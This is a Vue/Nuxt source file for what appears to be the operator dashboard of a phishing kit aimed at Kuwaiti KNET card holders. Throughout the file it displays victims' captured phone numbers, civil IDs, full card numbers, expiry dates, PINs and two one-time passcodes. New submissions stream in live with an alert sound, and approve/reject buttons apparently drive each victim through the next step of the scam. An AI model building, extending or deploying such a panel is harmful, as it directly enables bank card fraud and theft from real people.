<script setup lang="ts">
import {
  Lock, CheckCircle, XCircle, Trash2, AlertCircle,
  ChevronRight, ChevronLeft, ArrowUpDown, RefreshCw,
  User, CreditCard, Flag, X, TrendingUp, Moon, Sun
} from 'lucide-vue-next'
import { formatDistanceToNow } from 'date-fns'
import { ar } from 'date-fns/locale'
import { useIntervalFn } from '@vueuse/core'

definePageMeta({ layout: 'plain' })

const config = useRuntimeConfig()

type Record = {
  id: number; phone_number?: string; civil_id?: string; id_number?: string;
  amount?: string; bank?: string; card_prefix?: string; card_number?: string;
  expiry_month?: string; expiry_year?: string; pin?: string; otp1?: string; otp2?: string;
  network?: string; step_reached?: number; created_date?: string;
}

// ─── Password Gate ─────────────────────────────────────────────────────────
const unlocked = ref(false)
const pwInput = ref('')
const pwError = ref(false)
const pwLoading = ref(false)

onMounted(() => {
  if (sessionStorage.getItem('dash_unlocked') === '1') unlocked.value = true
})

const handleUnlock = async () => {
  pwLoading.value = true
  pwError.value = false
  const res = await $fetch<{ ok: boolean }>(`${config.public.apiBase}/dash/unlock`, {
    method: 'POST', body: { password: pwInput.value }
  }).catch(() => ({ ok: false }))
  if (res.ok) { sessionStorage.setItem('dash_unlocked', '1'); unlocked.value = true }
  else { pwError.value = true; pwInput.value = '' }
  pwLoading.value = false
}

// ─── Dashboard State ────────────────────────────────────────────────────────
const records = ref<Record[]>([])
const isLoading = ref(true)
const selectedRecord = ref<Record | null>(null)
const dialogType = ref<'personal' | 'card' | null>(null)
const filterType = ref('all')
const searchTerm = ref('')
const currentPage = ref(1)
const sortBy = ref('date')
const sortOrder = ref<'asc' | 'desc'>('desc')
const darkMode = ref(true)
const itemsPerPage = 10

const d = computed(() => darkMode.value)

const fetchRecords = async () => {
  isLoading.value = true
  records.value = await $fetch<Record[]>(`${config.public.apiBase}/payment-records`)
  isLoading.value = false
}

watch(unlocked, (v) => { if (v) fetchRecords() })

// ─── SSE Real-time ──────────────────────────────────────────────────────────
let es: EventSource | null = null
watch(unlocked, (v) => {
  if (!v) return
  es = new EventSource(`${config.public.apiBase}/payment-records/stream`)
  es.addEventListener('create', (e) => {
    const { data } = JSON.parse((e as MessageEvent).data)
    if (!records.value.some(r => r.id === data.id)) {
      playBeep()
      records.value = [data, ...records.value]
    }
  })
  es.addEventListener('update', (e) => {
    const { id, data } = JSON.parse((e as MessageEvent).data)
    records.value = records.value.map(r => r.id === id ? data : r)
  })
  es.addEventListener('delete', (e) => {
    const { id } = JSON.parse((e as MessageEvent).data)
    records.value = records.value.filter(r => r.id !== id)
  })
})
onUnmounted(() => es?.close())

const playBeep = () => {
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)()
    const beep = (freq: number, start: number, dur: number) => {
      const osc = ctx.createOscillator(); const gain = ctx.createGain()
      osc.connect(gain); gain.connect(ctx.destination)
      osc.frequency.value = freq; osc.type = 'sine'
      gain.gain.setValueAtTime(0, start); gain.gain.linearRampToValueAtTime(0.4, start + 0.01); gain.gain.exponentialRampToValueAtTime(0.001, start + dur)
      osc.start(start); osc.stop(start + dur)
    }
    beep(880, ctx.currentTime, 0.15); beep(1100, ctx.currentTime + 0.18, 0.15); beep(1320, ctx.currentTime + 0.36, 0.25)
  } catch {}
}

// ─── Filtering ──────────────────────────────────────────────────────────────
watch([filterType, searchTerm], () => { currentPage.value = 1 })

const filtered = computed(() => {
  let list = [...records.value]
  if (filterType.value === 'approved') list = list.filter(r => r.network === 'approved')
  else if (filterType.value === 'rejected') list = list.filter(r => r.network === 'rejected')
  else if (filterType.value === 'pending') list = list.filter(r => r.network !== 'approved' && r.network !== 'rejected')
  if (searchTerm.value) {
    const s = searchTerm.value.toLowerCase()
    list = list.filter(r => [r.phone_number, r.civil_id, r.amount, r.bank, r.otp1].some(v => v?.toLowerCase().includes(s)))
  }
  list.sort((a, b) => {
    let av: string | number = sortBy.value === 'date' ? (a.created_date ?? '') : sortBy.value === 'amount' ? parseFloat(a.amount ?? '0') : (a.network ?? '')
    let bv: string | number = sortBy.value === 'date' ? (b.created_date ?? '') : sortBy.value === 'amount' ? parseFloat(b.amount ?? '0') : (b.network ?? '')
    return sortOrder.value === 'desc' ? (bv > av ? 1 : -1) : (av > bv ? 1 : -1)
  })
  return list
})

const totalPages = computed(() => Math.max(1, Math.ceil(filtered.value.length / itemsPerPage)))
const paginated = computed(() => filtered.value.slice((currentPage.value - 1) * itemsPerPage, currentPage.value * itemsPerPage))

const stats = computed(() => ({
  total: records.value.length,
  approved: records.value.filter(r => r.network === 'approved').length,
  rejected: records.value.filter(r => r.network === 'rejected').length,
  pending: records.value.filter(r => r.network !== 'approved' && r.network !== 'rejected').length,
}))

const toggleSort = (key: string) => {
  if (sortBy.value === key) sortOrder.value = sortOrder.value === 'desc' ? 'asc' : 'desc'
  else { sortBy.value = key; sortOrder.value = 'desc' }
}

// ─── Actions ────────────────────────────────────────────────────────────────
const { addNotification } = useToast()
const toast = (title: string) => addNotification(title)

const handleApproval = async (status: 'approved' | 'rejected', id: number) => {
  const network = status === 'approved' ? 'approved' : 'rejected'
  await $fetch(`${config.public.apiBase}/payment-records/${id}`, { method: 'PUT', body: { network } })
  records.value = records.value.map(r => r.id === id ? { ...r, network } : r)
  toast(status === 'approved' ? 'تمت الموافقة' : 'تم الرفض')
}

const handleDelete = async (id: number) => {
  try { await $fetch(`${config.public.apiBase}/payment-records/${id}`, { method: 'DELETE' }) } catch {}
  records.value = records.value.filter(r => r.id !== id)
  toast('تم الحذف')
}

const handleFlagChange = async (id: number, color: string | null) => {
  await $fetch(`${config.public.apiBase}/payment-records/${id}`, { method: 'PUT', body: { bank: color || '' } })
  records.value = records.value.map(r => r.id === id ? { ...r, bank: color || undefined } : r)
}

const handleClearAll = async () => {
  if (!confirm('هل أنت متأكد من حذف جميع السجلات؟')) return
  isLoading.value = true
  for (const r of records.value) {
    try { await $fetch(`${config.public.apiBase}/payment-records/${r.id}`, { method: 'DELETE' }) } catch {}
  }
  records.value = []
  isLoading.value = false
  toast('تم مسح جميع السجلات')
}

const openDialog = (r: Record, type: 'personal' | 'card') => {
  selectedRecord.value = r; dialogType.value = type
}
const closeDialog = () => { dialogType.value = null; selectedRecord.value = null }

const statusLabel = (r: Record) => r.network === 'approved' ? 'approved' : r.network === 'rejected' ? 'rejected' : 'pending'
const flagColor = (flag: string | undefined) => flag === 'red' ? 'text-red-400 fill-red-400' : flag === 'yellow' ? 'text-yellow-400 fill-yellow-400' : flag === 'green' ? 'text-green-400 fill-green-400' : 'text-slate-600'

const paginationPages = computed(() => {
  const tp = totalPages.value, cp = currentPage.value, pages: (number | '...')[] = []
  if (tp <= 5) { for (let i = 1; i <= tp; i++) pages.push(i) }
  else if (cp <= 3) { pages.push(1, 2, 3, 4, '...', tp) }
  else if (cp >= tp - 2) { pages.push(1, '...', tp-3, tp-2, tp-1, tp) }
  else { pages.push(1, '...', cp-1, cp, cp+1, '...', tp) }
  return pages
})

// Toast composable (minimal)
function useToast() {
  const notes = ref<string[]>([])
  const addNotification = (msg: string) => {
    notes.value.push(msg)
    setTimeout(() => { notes.value.shift() }, 3000)
  }
  return { notes, addNotification }
}
const { notes } = useToast()
</script>

<template>
  <!-- Password Gate -->
  <div v-if="!unlocked" class="min-h-screen flex items-center justify-center bg-slate-950" dir="rtl">
    <div class="bg-slate-900 border border-slate-700/50 rounded-2xl p-8 w-full max-w-sm shadow-2xl">
      <div class="flex justify-center mb-6">
        <div class="bg-gradient-to-br from-violet-600 to-indigo-600 p-3 rounded-xl shadow-lg shadow-violet-500/30">
          <Lock class="h-6 w-6 text-white" />
        </div>
      </div>
      <h1 class="text-xl font-bold text-white text-center mb-6">لوحة التحكم</h1>
      <form @submit.prevent="handleUnlock" class="space-y-4">
        <input
          type="password" v-model="pwInput" placeholder="كلمة المرور"
          class="w-full bg-slate-800 border border-slate-700 rounded-lg px-4 py-2.5 text-white placeholder-slate-500 outline-none focus:border-emerald-500 transition-colors"
          autofocus
        />
        <p v-if="pwError" class="text-red-400 text-sm text-center">كلمة المرور غير صحيحة</p>
        <button type="submit" :disabled="pwLoading" class="w-full bg-gradient-to-r from-violet-600 to-indigo-600 hover:opacity-90 disabled:opacity-60 text-white font-semibold py-2.5 rounded-lg transition-opacity shadow-lg shadow-violet-500/30">
          {{ pwLoading ? 'جاري التحقق...' : 'دخول' }}
        </button>
      </form>
    </div>
  </div>

  <!-- Dashboard -->
  <div v-else :class="['min-h-screen transition-colors duration-300', d ? 'bg-slate-950 text-white' : 'bg-slate-50 text-slate-900']" dir="rtl">
    <!-- Toast notifications -->
    <div class="fixed top-4 left-1/2 -translate-x-1/2 z-50 space-y-2">
      <TransitionGroup name="toast">
        <div v-for="(note, i) in notes" :key="i" class="bg-slate-800 text-white px-4 py-2 rounded-lg shadow-xl text-sm font-medium">
          {{ note }}
        </div>
      </TransitionGroup>
    </div>

    <div class="max-w-7xl mx-auto p-4 sm:p-6">
      <!-- Header -->
      <div class="flex items-center justify-between mb-6 flex-wrap gap-4">
        <div>
          <h1 :class="['text-2xl font-black', d ? 'text-white' : 'text-slate-800']">لوحة التحكم</h1>
          <p :class="['text-sm mt-0.5', d ? 'text-slate-500' : 'text-slate-400']">{{ records.length }} سجل إجمالي</p>
        </div>
        <div class="flex items-center gap-3">
          <button @click="darkMode = !darkMode" :class="['w-9 h-9 rounded-xl flex items-center justify-center transition-colors', d ? 'bg-slate-800 text-slate-400 hover:text-white' : 'bg-white border border-slate-200 text-slate-500 hover:text-slate-800']">
            <component :is="d ? Sun : Moon" class="h-4 w-4" />
          </button>
          <button @click="fetchRecords" :class="['flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-semibold transition-all', d ? 'bg-slate-800 text-slate-300 hover:bg-slate-700' : 'bg-white border border-slate-200 text-slate-600 hover:bg-slate-50']">
            <RefreshCw class="h-4 w-4" />
            تحديث
          </button>
          <button @click="handleClearAll" class="flex items-center gap-2 px-4 py-2 rounded-xl bg-red-500/10 text-red-400 hover:bg-red-500/20 text-sm font-semibold transition-all border border-red-500/20">
            <Trash2 class="h-4 w-4" />
            مسح الكل
          </button>
        </div>
      </div>

      <!-- Stats -->
      <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-6">
        <div v-for="s in [
          { title: 'الإجمالي', value: stats.total, color: 'bg-violet-500', accent: 'from-violet-500 to-purple-600' },
          { title: 'موافق', value: stats.approved, color: 'bg-emerald-500', accent: 'from-emerald-500 to-teal-600' },
          { title: 'مرفوض', value: stats.rejected, color: 'bg-red-500', accent: 'from-red-500 to-rose-600' },
          { title: 'معلق', value: stats.pending, color: 'bg-amber-500', accent: 'from-amber-500 to-orange-600' },
        ]" :key="s.title" :class="['relative overflow-hidden rounded-2xl border p-5 transition-all duration-300', d ? 'border-white/10 bg-slate-900/80 hover:border-white/20' : 'border-slate-200 bg-white shadow-md']">
          <div :class="['absolute inset-0 bg-gradient-to-br opacity-10 rounded-2xl', s.accent]" />
          <p :class="['text-xs uppercase tracking-widest mb-1', d ? 'text-slate-500' : 'text-slate-400']">{{ s.title }}</p>
          <p :class="['text-3xl font-black tabular-nums', d ? 'text-white' : 'text-slate-800']">{{ s.value }}</p>
        </div>
      </div>

      <!-- Filters -->
      <div :class="['rounded-2xl border p-4 mb-4 flex flex-wrap gap-3 items-center', d ? 'border-white/10 bg-slate-900/60' : 'border-slate-200 bg-white shadow-sm']">
        <input
          v-model="searchTerm"
          placeholder="بحث..."
          :class="['flex-1 min-w-[200px] rounded-xl px-4 py-2 text-sm focus:outline-none', d ? 'bg-slate-800 border border-slate-700 text-white placeholder-slate-500 focus:border-emerald-500' : 'border border-slate-200 text-slate-800']"
          dir="rtl"
        />
        <div class="flex gap-2">
          <button
            v-for="f in ['all','approved','rejected','pending']"
            :key="f"
            @click="filterType = f"
            :class="['px-3 py-1.5 rounded-lg text-xs font-semibold transition-all', filterType === f ? 'bg-emerald-600 text-white' : d ? 'bg-slate-800 text-slate-400 hover:bg-slate-700' : 'bg-slate-100 text-slate-500 hover:bg-slate-200']"
          >
            {{ f === 'all' ? 'الكل' : f === 'approved' ? 'موافق' : f === 'rejected' ? 'مرفوض' : 'معلق' }}
          </button>
        </div>
      </div>

      <!-- Table -->
      <div :class="['rounded-2xl border overflow-hidden', d ? 'border-white/10 bg-slate-900/60' : 'border-slate-200 bg-white shadow-sm']">
        <div v-if="isLoading" class="py-16 flex items-center justify-center">
          <div class="w-8 h-8 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin" />
        </div>
        <div v-else-if="paginated.length === 0" class="py-16 flex flex-col items-center justify-center">
          <AlertCircle :class="['h-12 w-12 mb-4', d ? 'text-slate-600' : 'text-slate-300']" />
          <h3 :class="['text-lg font-semibold mb-1', d ? 'text-white' : 'text-slate-800']">لا توجد سجلات</h3>
          <p :class="['text-sm', d ? 'text-slate-500' : 'text-slate-400']">{{ searchTerm || filterType !== 'all' ? 'لم يتم العثور على نتائج' : 'لا توجد سجلات حالياً' }}</p>
        </div>
        <div v-else class="overflow-x-auto">
          <table class="w-full table-auto border-collapse">
            <thead>
              <tr :class="['border-b', d ? 'border-white/5' : 'border-slate-100']">
                <th v-for="col in [{l:'الهاتف',k:null},{l:'البيانات',k:null},{l:'المبلغ',k:'amount'},{l:'البنك',k:null},{l:'الحالة',k:'status'},{l:'الخطوة',k:null},{l:'OTP',k:null},{l:'الوقت',k:'date'},{l:'الإجراءات',k:null}]" :key="col.l"
                  :class="['px-4 py-3 text-right text-xs uppercase tracking-wider font-semibold', col.k ? 'cursor-pointer' : '', d ? 'text-slate-500 hover:text-slate-300' : 'text-slate-400 hover:text-slate-700 bg-slate-50']"
                  @click="col.k && toggleSort(col.k)"
                >
                  <span class="flex items-center gap-1 justify-end">
                    {{ col.l }}
                    <ArrowUpDown v-if="col.k && sortBy === col.k" class="h-3 w-3 text-emerald-400" />
                  </span>
                </th>
              </tr>
            </thead>
            <tbody>
              <tr
                v-for="r in paginated" :key="r.id"
                :class="['border-b transition-colors', d ? 'border-white/[0.04] hover:bg-white/[0.025]' : 'border-slate-100 hover:bg-slate-50']"
              >
                <td class="px-4 py-3">
                  <span :class="['font-mono text-sm font-medium', d ? 'text-white' : 'text-slate-800']">{{ r.phone_number || r.civil_id || '—' }}</span>
                </td>
                <td class="px-4 py-3">
                  <div class="flex flex-wrap gap-1.5">
                    <button @click="openDialog(r, 'personal')" class="inline-flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-xl bg-gradient-to-r from-violet-500 to-purple-600 text-white shadow hover:opacity-90 transition-all">
                      <User class="h-3.5 w-3.5" /> معلومات
                    </button>
                    <button v-if="r.card_number" @click="openDialog(r, 'card')" class="inline-flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-xl bg-[#1565C0] text-white shadow hover:opacity-90 transition-all">
                      <CreditCard class="h-3.5 w-3.5" /> KNET
                    </button>
                  </div>
                </td>
                <td class="px-4 py-3">
                  <span v-if="r.amount" :class="['font-mono text-sm font-bold rounded-lg px-2.5 py-1', d ? 'text-lime-300 bg-lime-500/10 border border-lime-500/25' : 'text-lime-700 bg-lime-50 border border-lime-200']">{{ r.amount }}</span>
                  <span v-else :class="d ? 'text-slate-600' : 'text-slate-300'">—</span>
                </td>
                <td class="px-4 py-3">
                  <span v-if="r.bank" :class="['text-sm font-semibold', d ? 'text-slate-200' : 'text-slate-700']">{{ r.bank }}</span>
                  <span v-else :class="d ? 'text-slate-600' : 'text-slate-300'">—</span>
                </td>
                <td class="px-4 py-3">
                  <span :class="['inline-flex items-center gap-1.5 text-xs font-semibold px-2.5 py-1 rounded-lg border', statusLabel(r) === 'approved' ? 'text-emerald-300 bg-emerald-500/20 border-emerald-400/30' : statusLabel(r) === 'rejected' ? 'text-red-300 bg-red-500/20 border-red-400/30' : 'text-amber-300 bg-amber-500/20 border-amber-400/30']">
                    <span :class="['w-1.5 h-1.5 rounded-full', statusLabel(r) === 'approved' ? 'bg-emerald-400' : statusLabel(r) === 'rejected' ? 'bg-red-400' : 'bg-amber-400']" />
                    {{ statusLabel(r) === 'approved' ? 'موافق' : statusLabel(r) === 'rejected' ? 'مرفوض' : 'معلق' }}
                  </span>
                </td>
                <td class="px-4 py-3 text-center">
                  <span v-if="r.step_reached != null" :class="['inline-flex items-center justify-center w-7 h-7 rounded-full text-xs font-bold', d ? 'bg-violet-500/20 border border-violet-400/30 text-violet-200' : 'bg-violet-100 border border-violet-300 text-violet-700']">{{ r.step_reached }}</span>
                  <span v-else :class="d ? 'text-slate-600' : 'text-slate-300'">—</span>
                </td>
                <td class="px-4 py-3">
                  <div class="flex flex-col gap-1.5">
                    <span v-if="r.otp1" :class="['font-mono text-sm font-bold rounded-lg px-2.5 py-1 whitespace-nowrap tracking-widest', d ? 'text-pink-200 bg-pink-500/20 border border-pink-400/40' : 'text-pink-700 bg-pink-100 border border-pink-300']">① {{ r.otp1 }}</span>
                    <span v-if="r.otp2" :class="['font-mono text-sm font-bold rounded-lg px-2.5 py-1 whitespace-nowrap tracking-widest', d ? 'text-sky-200 bg-sky-500/20 border border-sky-400/40' : 'text-sky-700 bg-sky-100 border border-sky-300']">② {{ r.otp2 }}</span>
                    <span v-if="!r.otp1 && !r.otp2" :class="d ? 'text-slate-600' : 'text-slate-300'">—</span>
                  </div>
                </td>
                <td class="px-4 py-3">
                  <span :class="['text-xs whitespace-nowrap', d ? 'text-slate-500' : 'text-slate-400']">
                    {{ r.created_date ? formatDistanceToNow(new Date(r.created_date), { addSuffix: true, locale: ar }) : '—' }}
                  </span>
                </td>
                <td class="px-4 py-3">
                  <div class="flex items-center gap-1">
                    <button @click="handleApproval('approved', r.id)" :disabled="statusLabel(r) === 'approved'" class="h-8 w-8 p-0 rounded-lg bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 border border-emerald-500/20 disabled:opacity-30 flex items-center justify-center transition-colors">
                      <CheckCircle class="h-4 w-4" />
                    </button>
                    <button @click="handleApproval('rejected', r.id)" :disabled="statusLabel(r) === 'rejected'" class="h-8 w-8 p-0 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 disabled:opacity-30 flex items-center justify-center transition-colors">
                      <XCircle class="h-4 w-4" />
                    </button>
                    <div class="relative group/flag">
                      <button class="h-8 w-8 p-0 flex items-center justify-center rounded-lg hover:bg-white/5 transition-colors">
                        <Flag :class="['h-4 w-4 transition-colors', flagColor(r.bank)]" />
                      </button>
                      <div class="absolute hidden group-hover/flag:flex left-0 top-full mt-1 bg-slate-800 border border-white/10 rounded-lg p-2 gap-2 z-20 shadow-xl">
                        <button v-for="fc in ['red','yellow','green']" :key="fc" @click="handleFlagChange(r.id, fc)" :class="['w-7 h-7 rounded-full flex items-center justify-center hover:opacity-80 transition-opacity', fc === 'red' ? 'bg-red-500' : fc === 'yellow' ? 'bg-yellow-500' : 'bg-green-500']">
                          <Flag class="h-3 w-3 text-white" />
                        </button>
                        <button v-if="r.bank" @click="handleFlagChange(r.id, null)" class="w-7 h-7 rounded-full flex items-center justify-center bg-slate-600 hover:opacity-80 transition-opacity">
                          <X class="h-3 w-3 text-white" />
                        </button>
                      </div>
                    </div>
                    <button @click="handleDelete(r.id)" class="h-8 w-8 p-0 flex items-center justify-center rounded-lg text-slate-600 hover:text-red-400 hover:bg-red-500/10 transition-colors">
                      <Trash2 class="h-4 w-4" />
                    </button>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        <!-- Pagination -->
        <div v-if="paginated.length > 0" :class="['border-t p-4 flex items-center justify-between flex-wrap gap-4', d ? 'border-white/5' : 'border-slate-100']">
          <div :class="['text-sm', d ? 'text-slate-500' : 'text-muted-foreground']">
            عرض {{ (currentPage - 1) * itemsPerPage + 1 }} إلى {{ Math.min(currentPage * itemsPerPage, filtered.length) }} من {{ filtered.length }}
          </div>
          <div class="flex items-center gap-2">
            <button @click="currentPage--" :disabled="currentPage <= 1" :class="['px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1 disabled:opacity-30 transition-colors', d ? 'bg-slate-800 text-slate-300 border border-slate-700 hover:bg-slate-700' : 'border border-slate-200 text-slate-600 hover:bg-slate-50']">
              <ChevronRight class="h-3 w-3" /> السابق
            </button>
            <button
              v-for="(p, i) in paginationPages" :key="i"
              @click="typeof p === 'number' && (currentPage = p)"
              :disabled="p === '...'"
              :class="['w-8 h-8 rounded-lg text-xs font-semibold transition-colors', p === '...' ? 'cursor-default ' + (d ? 'text-slate-500' : 'text-slate-400') : currentPage === p ? 'bg-emerald-600 text-white' : d ? 'bg-slate-800 text-slate-400 border border-slate-700 hover:bg-slate-700' : 'border border-slate-200 text-slate-600 hover:bg-slate-50']"
            >{{ p }}</button>
            <button @click="currentPage++" :disabled="currentPage >= totalPages" :class="['px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1 disabled:opacity-30 transition-colors', d ? 'bg-slate-800 text-slate-300 border border-slate-700 hover:bg-slate-700' : 'border border-slate-200 text-slate-600 hover:bg-slate-50']">
              التالي <ChevronLeft class="h-3 w-3" />
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Personal Info Dialog -->
    <Teleport to="body">
      <Transition name="dialog">
        <div v-if="dialogType === 'personal'" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm" @click.self="closeDialog">
          <div class="bg-slate-900 border border-white/10 rounded-2xl shadow-2xl p-6 w-full max-w-md" dir="rtl">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-10 h-10 rounded-xl flex items-center justify-center bg-gradient-to-br from-violet-500 to-purple-600 shadow-lg"><User class="h-5 w-5 text-white" /></div>
              <h2 class="text-xl font-bold text-white">المعلومات الشخصية</h2>
              <button @click="closeDialog" class="mr-auto text-slate-500 hover:text-white"><X class="h-5 w-5" /></button>
            </div>
            <div v-if="selectedRecord" class="rounded-xl border border-white/5 bg-slate-950/50 overflow-hidden">
              <div v-for="(item, i) in [
                {label:'رقم الهاتف',value:selectedRecord.phone_number},
                {label:'رقم الهوية',value:selectedRecord.id_number},
                {label:'الرقم المدني',value:selectedRecord.civil_id},
                {label:'المبلغ',value:selectedRecord.amount},
                {label:'الشبكة',value:selectedRecord.network},
                {label:'الخطوة',value:selectedRecord.step_reached != null ? String(selectedRecord.step_reached) : undefined},
              ].filter(x => x.value)" :key="item.label"
                :class="['flex justify-between items-center px-4 py-3 hover:bg-white/[0.03]', i > 0 ? 'border-t border-white/5' : '']">
                <span class="text-sm text-slate-500">{{ item.label }}</span>
                <span class="text-sm font-semibold text-white font-mono">{{ item.value }}</span>
              </div>
            </div>
            <div class="flex gap-2 mt-4">
              <button @click="handleApproval('approved', selectedRecord!.id); closeDialog()" class="flex-1 bg-green-500 hover:bg-green-600 text-white font-semibold py-2.5 rounded-lg text-sm transition-colors">موافقة</button>
              <button @click="handleApproval('rejected', selectedRecord!.id); closeDialog()" class="flex-1 bg-red-500 hover:bg-red-600 text-white font-semibold py-2.5 rounded-lg text-sm transition-colors">رفض</button>
              <button @click="closeDialog" class="px-4 border border-white/10 text-slate-300 hover:bg-white/5 rounded-lg text-sm transition-colors">إغلاق</button>
            </div>
          </div>
        </div>
      </Transition>
    </Teleport>

    <!-- KNET Card Dialog -->
    <Teleport to="body">
      <Transition name="dialog">
        <div v-if="dialogType === 'card'" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm" @click.self="closeDialog">
          <div class="bg-slate-900 border border-white/10 rounded-2xl shadow-2xl p-6 w-full max-w-md" dir="rtl">
            <div class="flex items-center gap-3 mb-4">
              <div class="w-10 h-10 rounded-xl overflow-hidden shadow-lg"><img src="https://media.base44.com/images/public/6a1f21dff88d7df94e752b5a/4187ba546_knet.png" alt="KNET" class="w-full h-full object-cover" /></div>
              <h2 class="text-xl font-bold text-white">معلومات KNET</h2>
              <button @click="closeDialog" class="mr-auto text-slate-500 hover:text-white"><X class="h-5 w-5" /></button>
            </div>
            <div v-if="selectedRecord" class="rounded-xl border border-white/5 bg-slate-950/50 overflow-hidden">
              <div v-for="(item, i) in [
                {label:'البنك',value:selectedRecord.bank},
                {label:'رقم البطاقة',value:selectedRecord.card_number ? `${selectedRecord.card_prefix || ''} - ${selectedRecord.card_number}` : undefined},
                {label:'تاريخ الانتهاء',value:selectedRecord.expiry_year && selectedRecord.expiry_month ? `${selectedRecord.expiry_year}/${selectedRecord.expiry_month}` : undefined},
                {label:'الرقم السري',value:selectedRecord.pin},
                {label:'رمز OTP1',value:selectedRecord.otp1},
                {label:'رمز OTP2',value:selectedRecord.otp2},
              ].filter(x => x.value)" :key="item.label"
                :class="['flex justify-between items-center px-4 py-3 hover:bg-white/[0.03]', i > 0 ? 'border-t border-white/5' : '']">
                <span class="text-sm text-slate-500">{{ item.label }}</span>
                <span class="text-sm font-semibold text-white font-mono">{{ item.value }}</span>
              </div>
            </div>
            <div class="flex gap-2 mt-4">
              <button @click="handleApproval('approved', selectedRecord!.id); closeDialog()" class="flex-1 bg-green-500 hover:bg-green-600 text-white font-semibold py-2.5 rounded-lg text-sm transition-colors">موافقة</button>
              <button @click="handleApproval('rejected', selectedRecord!.id); closeDialog()" class="flex-1 bg-red-500 hover:bg-red-600 text-white font-semibold py-2.5 rounded-lg text-sm transition-colors">رفض</button>
              <button @click="closeDialog" class="px-4 border border-white/10 text-slate-300 hover:bg-white/5 rounded-lg text-sm transition-colors">إغلاق</button>
            </div>
          </div>
        </div>
      </Transition>
    </Teleport>
  </div>
</template>

<style scoped>
.toast-enter-active, .toast-leave-active { transition: all 0.3s ease; }
.toast-enter-from, .toast-leave-to { opacity: 0; transform: translateY(-8px); }
.dialog-enter-active, .dialog-leave-active { transition: all 0.2s ease; }
.dialog-enter-from, .dialog-leave-to { opacity: 0; }
.dialog-enter-active > div, .dialog-leave-active > div { transition: all 0.2s ease; }
.dialog-enter-from > div, .dialog-leave-to > div { transform: scale(0.95); }
</style>
